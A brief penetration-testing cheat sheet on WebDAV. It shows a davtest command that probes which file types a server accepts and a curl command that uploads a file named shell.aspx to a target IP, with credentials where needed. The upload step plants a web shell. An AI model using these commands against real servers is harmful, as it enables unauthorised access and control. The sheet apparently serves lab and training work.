# Webdav

## davtest&#x20;

If we want to know the type of file we can upload to a webserver, try this Kali tool.

```bash
# Test possible file extensions to upload
davtest --url http://$IP
```

## Upload a file with curl

```bash
curl -T '/home/kali/shell.aspx' 'http://$IP/' -u $user:$pass # if auth needed
```
